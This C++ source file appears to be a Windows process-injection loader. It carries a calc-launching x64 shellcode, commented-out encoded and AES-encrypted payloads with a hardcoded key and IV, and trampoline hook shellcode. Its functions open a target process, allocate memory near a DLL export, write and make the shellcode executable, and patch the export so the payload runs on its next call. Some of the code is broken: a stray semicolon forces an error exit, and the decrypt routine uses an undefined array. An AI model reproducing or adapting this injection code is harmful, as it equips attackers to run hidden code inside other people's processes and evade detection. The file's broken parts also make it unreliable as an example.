#include "headers/payload.h"
#include "utils/headers/CRTdefs.h"
#include "intrin.h"
#include <winternl.h>
#include "utils/headers/Tools.h"
#include "utils/headers/aes.h"

// x64 calc payload
unsigned char payload[106] = {
	0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
	0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
	0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
	0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
	0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
	0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
	0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
	0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};
//
//unsigned char g_Payload[] =
//"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef"
//"\xff\xff\xff\x48\xbb\x7b\x14\xa0\xdd\xa2\x85\xfa\xb3\x48"
//"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x87\x5c\x23"
//"\x39\x52\x6d\x36\xb3\x7b\x14\xe1\x8c\xe3\xd5\xa8\xe2\x33"
//"\x25\x72\xb8\xea\x0e\xa8\xd3\x33\x9f\xf2\xc5\xea\x0e\xa8"
//"\x93\x2d\x59\x91\x14\xea\x8a\x4d\xf9\x31\x5c\x2b\xaf\xf2"
//"\xcd\xcb\x73\xd7\x28\xc1\xa1\xa0\xa9\xda\xf2\xba\xdd\xad"
//"\x9c\xa3\x44\x18\x5e\x29\x55\xf1\x95\x29\xd7\xda\x38\x39"
//"\x28\xe8\xdc\x72\xe3\x7b\xcb\x63\x1f\xa2\xd2\x27\xf7\xfa"
//"\xb3\x7b\x9f\x20\x55\xa2\x85\xfa\xfb\xfe\xd4\xd4\xba\xea"
//"\x84\x2a\x38\x33\x0c\xf0\x99\x29\xc5\xda\xfa\x7a\xc4\x43"
//"\x8b\xef\xb4\x33\xfb\x84\xdd\xe1\x56\x96\x0d\xb2\xb2\xad"
//"\x5c\x91\x1d\xe3\x44\x33\xbe\xd7\x55\xa1\x1c\x9a\x65\x8f"
//"\x42\x37\x17\xec\xf9\xaa\xc0\xc3\x62\x0e\xcc\xf8\x99\x29"
//"\xc5\xde\xfa\x7a\xc4\xc6\x9c\x29\x89\xb2\xf7\xf0\x54\xbc"
//"\x94\xa3\x55\xbb\x38\x7f\x9c\xe1\x85\xea\x84\x2a\xf2\x23"
//"\x4a\xf9\x87\xe3\xdd\xbb\xea\x3a\x4e\xe8\x5e\x4e\xa5\xbb"
//"\xe1\x84\xf4\xf8\x9c\xfb\xdf\xb2\x38\x69\xfd\xeb\x22\x5d"
//"\x7a\xa7\xfa\xc5\x63\xd3\xef\xfd\xb6\xc8\xb3\x7b\x55\xf6"
//"\x94\x2b\x63\xb2\x32\x97\xb4\xa1\xdd\xa2\xcc\x73\x56\x32"
//"\xa8\xa2\xdd\xb3\xd9\x3a\x1b\x43\x72\xe1\x89\xeb\x0c\x1e"
//"\xff\xf2\xe5\xe1\x67\xee\xf2\xdc\xb4\x84\xc1\xec\x54\x48"
//"\xed\xfb\xb2\x7b\x14\xf9\x9c\x18\xac\x7a\xd8\x7b\xeb\x75"
//"\xb7\xa8\xc4\xa4\xe3\x2b\x59\x91\x14\xef\xb4\x3a\xfb\x84"
//"\xd4\xe8\x54\x60\xcd\x05\x73\x33\x9d\x61\x9c\x18\x6f\xf5"
//"\x6c\x9b\xeb\x75\x95\x2b\x42\x90\xa3\x3a\x4c\xec\x54\x40"
//"\xcd\x73\x4a\x3a\xae\x39\x78\xd6\xe4\x05\x66\xfe\xd4\xd4"
//"\xd7\xeb\x7a\x34\xc6\x9e\xfc\x33\xdd\xa2\x85\xb2\x30\x97"
//"\x04\xe8\x54\x40\xc8\xcb\x7a\x11\x10\xe1\x85\xea\x0c\x03"
//"\xf2\xc1\x16\x79\x15\xfd\x7a\x2f\x30\x83\x14\xde\x88\xea"
//"\x06\x3e\x93\x25\x9d\x56\xb7\xe2\xc4\xa3\xdb\x7b\x04\xa0"
//"\xdd\xe3\xdd\xb2\x3a\x89\x5c\x91\x14\xe3\x3f\xa2\x17\x28"
//"\xf1\x5f\x08\xea\x0c\x39\xfa\xf2\xd3\xed\xec\x6b\xcc\x73"
//"\x43\x33\x9d\x7a\x95\x2b\x7c\xbb\x09\x79\xcd\x68\x82\x5d"
//"\x50\x79\x4b\x7b\x69\x88\x85\xe3\xd2\xa3\xdb\x7b\x54\xa0"
//"\xdd\xe3\xdd\x90\xb3\x21\x55\x1a\xd6\x8d\x8a\xca\x4c\xae"
//"\x43\xf9\x9c\x18\xf0\x94\xfe\x1a\xeb\x75\x94\x5d\x4b\x13"
//"\x8f\x84\xeb\x5f\x95\xa3\x46\xb2\x9a\xbd\x5c\x25\x2b\xd7"
//"\x31\xbb\x4c\x9c\x4c\xca\xdd\xfb\xcc\x3d\x71\x8b\xa1\x02"
//"\x8b\x5d\x50\xfa\xb3";



unsigned char pKey[] = {
		0x56, 0x00, 0x92, 0x1B, 0xF2, 0x87, 0x2A, 0x09, 0x48, 0x6A, 0x14, 0xD1, 0x9C, 0xAB, 0xD9, 0x2A,
		0xD7, 0x61, 0xC6, 0x7B, 0xDA, 0xB7, 0xE5, 0xF9, 0x12, 0x37, 0x2C, 0x10, 0x4C, 0x49, 0xF3, 0x05 };


unsigned char pIv[] = {
		0xA6, 0xC2, 0x59, 0x40, 0x37, 0x3C, 0xA2, 0x82, 0x5E, 0x46, 0x47, 0x86, 0xB0, 0x6E, 0xB0, 0xEA };


//unsigned char g_Payload[] = {
//		0x85, 0x14, 0xAA, 0x0A, 0x50, 0xD8, 0xC0, 0x28, 0x54, 0xC0, 0x19, 0x31, 0x15, 0xF9, 0x7C, 0xBB,
//		0x94, 0x25, 0xC2, 0x61, 0x4A, 0xCF, 0x64, 0x14, 0xC0, 0xB2, 0x3C, 0xAC, 0xAF, 0x9D, 0x8F, 0xE3,
//		0x70, 0x3B, 0x0C, 0x70, 0x4C, 0x7C, 0x31, 0x59, 0x19, 0xDB, 0x6C, 0x45, 0x8D, 0x94, 0x89, 0xAE,
//		0xD0, 0xC3, 0xA0, 0x30, 0xCF, 0x3D, 0x62, 0xD7, 0xA6, 0x81, 0x42, 0x18, 0xFB, 0xBF, 0x60, 0x56,
//		0x1F, 0x2F, 0x53, 0x1F, 0x24, 0x97, 0xF5, 0x04, 0x52, 0xD5, 0x63, 0x8D, 0xE7, 0x28, 0x79, 0xE2,
//		0xD2, 0xBE, 0xF4, 0x74, 0x25, 0xD3, 0x16, 0x14, 0xD4, 0x44, 0x9A, 0x44, 0x42, 0x4E, 0xBF, 0xC3,
//		0xD6, 0x3F, 0x3C, 0x2B, 0x41, 0x68, 0x78, 0x1F, 0x7C, 0xD1, 0x4F, 0x7E, 0x05, 0x0E, 0x89, 0x61,
//		0x07, 0xF9, 0x61, 0x41, 0x4A, 0xF5, 0x52, 0x9C, 0xB1, 0x14, 0x73, 0xC5, 0xBB, 0x51, 0x25, 0x64,
//		0x5D, 0x86, 0xFD, 0x60, 0xEC, 0x01, 0x8A, 0xC4, 0x77, 0xE8, 0xA4, 0x95, 0xA3, 0x48, 0x1A, 0xA7,
//		0xDC, 0xC0, 0xB2, 0xD5, 0x7E, 0x07, 0x45, 0x7B, 0xB3, 0xFA, 0x8A, 0xEE, 0x9C, 0xDE, 0xED, 0xB5,
//		0xD9, 0xA8, 0x50, 0x8C, 0x38, 0x27, 0xA0, 0x7B, 0xB9, 0x3F, 0xDA, 0x75, 0x94, 0xCE, 0x7B, 0xD4,
//		0x4C, 0x6A, 0x43, 0x5C, 0x0C, 0x12, 0x9C, 0x94, 0x67, 0xD8, 0x05, 0x68, 0xE4, 0x65, 0x2E, 0xC1,
//		0x8B, 0x63, 0x82, 0x27, 0x0F, 0x5A, 0x9E, 0x03, 0x95, 0x39, 0xA7, 0xF8, 0x09, 0xA9, 0x07, 0x1B,
//		0xC6, 0xE7, 0x0B, 0x92, 0xBE, 0x92, 0x29, 0x3E, 0x6C, 0x05, 0xFB, 0x6D, 0x8B, 0x5C, 0xB4, 0x21,
//		0x97, 0x01, 0x8E, 0xA6, 0xA6, 0x67, 0x07, 0x95, 0x34, 0x53, 0x3D, 0xBD, 0xC2, 0x16, 0x06, 0x21,
//		0x3B, 0x7A, 0x13, 0x3B, 0x7D, 0x92, 0x37, 0x0E, 0x80, 0x95, 0x05, 0xCD, 0xF9, 0x66, 0x27, 0xA0,
//		0x8E, 0xFA, 0x49, 0x29, 0xD4, 0x3B, 0xDB, 0x32, 0x8D, 0x15, 0x7E, 0xEC, 0x13, 0x83, 0xD0, 0x5F,
//		0x66, 0xD3, 0xCC, 0x6D, 0x51, 0x90, 0xED, 0xCF, 0x91, 0x73, 0xA4, 0x53, 0x20, 0x69, 0xFB, 0x3C,
//		0x8A, 0x3C, 0x60, 0xE9, 0x7D, 0x28, 0x5C, 0x40, 0xEF, 0xC4, 0xBF, 0xF8, 0xBD, 0xCA, 0x7E, 0x9D,
//		0xAE, 0x34, 0x87, 0x8F, 0x13, 0xFA, 0x6C, 0x71, 0x4C, 0xE5, 0x02, 0x4B, 0xFF, 0x4E, 0x6F, 0xAF,
//		0x37, 0x4C, 0x0E, 0x83, 0x2C, 0xD5, 0x69, 0x7C, 0xBA, 0x1A, 0x79, 0x67, 0xB8, 0xF0, 0xE2, 0x4A,
//		0xE8, 0xE7, 0xDD, 0x9A, 0x07, 0xB5, 0x1A, 0x02, 0xD3, 0x72, 0xCD, 0x71, 0x67, 0x18, 0x87, 0x3A,
//		0xC4, 0xB8, 0x88, 0x41, 0xC7, 0x6B, 0x61, 0x7B, 0xA9, 0x98, 0x15, 0xA2, 0x1F, 0xCD, 0x16, 0x7D,
//		0xCD, 0x85, 0x31, 0xB6, 0x57, 0x6D, 0xDD, 0x63, 0xB5, 0x21, 0x68, 0x11, 0xAF, 0x94, 0x0C, 0x55,
//		0xEA, 0x47, 0x30, 0x61, 0x3D, 0xB6, 0x9A, 0x17, 0x24, 0x29, 0xB8, 0xEE, 0xAB, 0x38, 0x9C, 0x7C,
//		0x40, 0xE8, 0x4E, 0x26, 0x92, 0xAA, 0x58, 0xE6, 0xF6, 0xF4, 0xF9, 0x52, 0xD8, 0x53, 0x73, 0x58,
//		0xE8, 0x05, 0x09, 0x9E, 0x9A, 0x2F, 0x4F, 0x4E, 0x65, 0xFF, 0x8B, 0x20, 0x74, 0x1C, 0x19, 0xE9,
//		0x37, 0x7A, 0xEA, 0x91, 0x6D, 0x59, 0x6E, 0x1A, 0xC4, 0x64, 0xC6, 0x64, 0x1C, 0x14, 0x8A, 0xBD,
//		0xD9, 0xD5, 0x21, 0xA7, 0x82, 0x34, 0xF1, 0x04, 0xBF, 0x21, 0x28, 0x52, 0xF4, 0xAD, 0x15, 0x96,
//		0x38, 0x29, 0x98, 0x90, 0x8B, 0xB8, 0xA5, 0xDF, 0xCD, 0x7F, 0x6B, 0x5B, 0xE4, 0x02, 0x8F, 0x29,
//		0x64, 0x56, 0x92, 0xDE, 0x3C, 0xB1, 0xE8, 0x3F, 0x6B, 0x15, 0x27, 0xC5, 0x5B, 0x23, 0x7D, 0xEE,
//		0x94, 0x1A, 0x9F, 0x58, 0x58, 0x7B, 0x43, 0x16, 0x98, 0x9D, 0x1B, 0xBC, 0x2B, 0xD0, 0xDE, 0x02,
//		0x35, 0xDC, 0xEC, 0x8B, 0xFD, 0x9A, 0xF0, 0xA0, 0xEC, 0x62, 0xD5, 0xE5, 0xAE, 0xEA, 0x45, 0x51,
//		0xBE, 0xF3, 0x55, 0x8E, 0xB7, 0x79, 0xD0, 0x43, 0x26, 0x51, 0x6B, 0xC5, 0xB9, 0x0B, 0xFD, 0xD7,
//		0xE1, 0x58, 0xA3, 0x37, 0xBC, 0xEC, 0x48, 0x9E, 0x56, 0xE1, 0xFB, 0xCF, 0x1D, 0x4E, 0x20, 0xDB };


// Trampoline hook shellcode
unsigned char g_Hook[63] = {
	0x5B, 0x48, 0x83, 0xEB, 0x04, 0x48, 0x83, 0xEB, 0x01, 0x53, 0x51,
	0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48, 0xB9,
	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0x0B,
	0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x11, 0x00,
	0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41,
	0x58, 0x41, 0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
};



// Executes the payload by instantiating the class
Payload::Payload(DWORD process, API::API_ACCESS& api, const char* dll, char* function)
{
	Tools tools;

	ULONG_PTR uAddress    = NULL;

	//auto decrypted_payload = DecryptPayload();

	HMODULE hModule = GetModuleHandleA(dll);

	if (hModule == INVALID_HANDLE_VALUE)
	{
		MessageBoxA(NULL, "invalid module handle", "error", MB_ICONWARNING);
		ExitProcess(-1);
	}

	FARPROC pFunctionToHook = (FARPROC)API::GetProcessAddress(hModule, function);

	if (!pFunctionToHook)
	{
		MessageBoxA(NULL, "couldn't get address of function", "error", MB_ICONWARNING);
		ExitProcess(-1);
	}

	PatchHook(pFunctionToHook);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, process);

	if (hProcess == INVALID_HANDLE_VALUE)
		tools.ExitProgram("failed to get a handle to the process");

	if (!LocateMemoryGap(hProcess, &uAddress, reinterpret_cast<ULONG_PTR>(pFunctionToHook), sizeof(payload) + sizeof(g_Hook), api))
		tools.ExitProgram("failed to find a memory gap");


	if (!WritePayloadBuffer(hProcess, uAddress, (ULONG_PTR)g_Hook, sizeof(g_Hook), (ULONG_PTR)payload, sizeof(payload)));
		tools.ExitProgram("failed to write payload buffer");


	if (!InstallHook(hProcess, pFunctionToHook, reinterpret_cast<void*>(uAddress)))
		tools.ExitProgram("failed to install hook");


	MessageBoxA(NULL, "installed payload", "yay", MB_ICONWARNING);
}

// Locates a memory gap next to the DLL that exports the hooked function
bool Payload::LocateMemoryGap(HANDLE hProcess, _Out_ ULONG_PTR* puAddress, uintptr_t pHookedFunction, size_t sPayloadSize, API::API_ACCESS& api) {

	NTSTATUS    status    = NULL;
	ULONG_PTR   uAddress  = NULL;
	size_t      sTempSize = sPayloadSize;

	if (!api.func.pNtAllocateVirtualMemory)
		return false;

	for (uAddress = (pHookedFunction & 0xFFFFFFFFFFF70000) - 0x70000000;
		uAddress < pHookedFunction + 0x70000000;
		uAddress += 0x10000) {

		// Attempt to allocate virtual memory
		status = api.func.pNtAllocateVirtualMemory(hProcess, reinterpret_cast<void**>(&uAddress), 0x00, &sTempSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (NT_SUCCESS(status)) {
			*puAddress = uAddress;
			return true;
		}
	}

	return false;
}



// This function redirects execution to the shellcode put into the memory gap, which uses a relative call instruction which requires an offset
bool Payload::InstallHook(HANDLE hProcess, void *pExportedFunc, void* pMainPayloadAddress)
{
	NTSTATUS status		   = NULL;

	DWORD dwOldProtection  = NULL;
	UCHAR uTrampoline[0x5] = { 0xE8, 0x0, 0x0, 0x0, 0x0 }; // Call rva
	unsigned long uRVA     = static_cast<unsigned long>((reinterpret_cast<ULONG_PTR>(pMainPayloadAddress) - (reinterpret_cast<ULONG_PTR>(pExportedFunc) + sizeof(uTrampoline)))); // The RVA 
	
	size_t sTempSize	   = sizeof(uTrampoline); 
	size_t sBytesWritten   = NULL;

	void *pTempAddr		   = pExportedFunc;

	auto &resolver = API::APIResolver::GetInstance();
	auto api		  = resolver.GetAPIAccess();

	if (!api.func.pNtProtectVirtualMemory || !api.func.pNtWriteVirtualMemory || !api.func.pNtProtectVirtualMemory)
		return false;
	
	memcpy(&uTrampoline[1], &uRVA, sizeof(uRVA));

	// Get write access to the targeted function
	if (!NT_SUCCESS(status = api.func.pNtProtectVirtualMemory(hProcess, &pTempAddr, &sTempSize, PAGE_READWRITE, &dwOldProtection)))
	{
		MessageBoxA(NULL, "failed to get write access to the targeted function", "error", MB_ICONWARNING);
		return false;
	}

	// Patch 5 bytes of the exported function with the trampoline
	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, pExportedFunc, uTrampoline, sizeof(uTrampoline), &sBytesWritten))) || sBytesWritten != sizeof(uTrampoline))
	{
		MessageBoxA(NULL, "failed to patch function", "error", MB_ICONWARNING);

		return false;
	}

	// Restore values
	sTempSize = sizeof(uTrampoline);
	pTempAddr = pExportedFunc;

	// Mark pExportedFunc as rwx, shellcode will restore bytes that were replaced by the trampoline
	if (!NT_SUCCESS(status = api.func.pNtProtectVirtualMemory(hProcess, &pTempAddr, &sTempSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))
	{
		MessageBoxA(NULL, "failed to make function rwx", "error", MB_ICONWARNING);
		return false;
	}
	return true;
}

/* Hook shellcode
https://defuse.ca/online-x86-assembler.htm
																	  ; Original Shellcode:
start:
	; Save the address of the hooked function to the stack
	0:  5b                      pop    rbx							; instead of 'pop rax'
	1:  48 83 eb 04             sub    rbx,0x4						; instead of 'sub rax,0x5'
	5:  48 83 eb 01             sub    rbx,0x1
	9:  53                      push   rbx							; instead of 'push rax'

	; Save the hooked function's parameters
	a:  51                      push   rcx
	b:  52                      push   rdx
	c:  41 51                   push   r9							; instead of 'push r8'
	e:  41 50                   push   r8							; instead of 'push r9'
	10: 41 53                   push   r11							; instead of 'push r10'
	12: 41 52                   push   r10							; instead of 'push r11'

	; "0xaaaaaaaaaaaaaaaa" will be patched at runtime
	; Restore the hooked function's original bytes
	14: 48 b9 aa aa aa aa aa    movabs rcx,0xaaaaaaaaaaaaaaaa			; Place holder of the original bytes of the hooked function - instead of '0x1122334455667788'    (AT BYTE NMBR: 22)
	1b: aa aa aa
	1e: 48 89 0b                mov    QWORD PTR [rbx],rcx			; instead of '[rax]'

	; Execute the main payload
	21: 48 83 ec 20             sub    rsp,0x20
	25: 48 83 ec 20             sub    rsp,0x20
	29: e8 11 00 00 00          call   3f <shellcode>
	2e: 48 83 c4 40             add    rsp,0x40

	; Restore the hooked function's parameters
	32: 41 5a                   pop    r10							; instead of 'pop r11'
	34: 41 5b                   pop    r11							; instead of 'pop r10'
	36: 41 58                   pop    r8							; instead of 'pop r9'
	38: 41 59                   pop    r9							; instead of 'pop r8'
	3a: 5a                      pop    rdx
	3b: 59                      pop    rcx

	; Pass the execution to the hooked function, that will execute normally
	3c: 5b                      pop    rbx							; instead of 'pop rax'
	3d: ff e3                   jmp    rbx							; instead of 'jmp rax'

*/


void Payload::PatchHook(void *pExportedFunc) {
	// ullOriginalBytes is the first 8 bytes of the hooked function (before hooking)
	unsigned long long uOriginalBytes = *(unsigned long long*)pExportedFunc;

	// The place holder (0xaaaaaaaaaaaaaaaa) is at the 22nd byte
	memcpy(&g_Hook[22], &uOriginalBytes, sizeof(uOriginalBytes));
}

bool Payload::WritePayloadBuffer( HANDLE hProcess, ULONG_PTR uAddress, ULONG_PTR uHookShellcode, size_t sHookShellcodeSize, ULONG_PTR uPayloadBuffer, size_t sPayloadSize)
{

	size_t		sTempSize		= sPayloadSize;
	size_t		sBytesWritten   = 0x00;
	DWORD		dwOldProtection = 0x00;
	NTSTATUS	status			= NULL;

	auto& resolver = API::APIResolver::GetInstance();
	auto api		  = resolver.GetAPIAccess();

	// Write g_HookShellcode
	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, reinterpret_cast<void*>(uAddress), reinterpret_cast<void*>(uHookShellcode), sHookShellcodeSize, &sBytesWritten))) || sBytesWritten != sHookShellcodeSize) 
		return false;
	
	// Write main payload after g_HookShellcode
	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, reinterpret_cast<void*>(uAddress + sBytesWritten), reinterpret_cast<void*>(uPayloadBuffer), sPayloadSize, &sBytesWritten))) || sBytesWritten != sPayloadSize) 
		return false;
	
	if (!NT_SUCCESS((status = api.func.pNtProtectVirtualMemory(hProcess, reinterpret_cast<void**>(&uAddress), &sTempSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) 
		return false;
	

	return true;
}

unsigned char* Payload::DecryptPayload()
{
	struct AES_ctx ctx;
	// Initilizing the Tiny-Aes Library
	AES_init_ctx_iv(&ctx, pKey, pIv);

	// Decrypting
	AES_CBC_decrypt_buffer(&ctx, g_Payload, sizeof(payload));

	return g_Payload;
}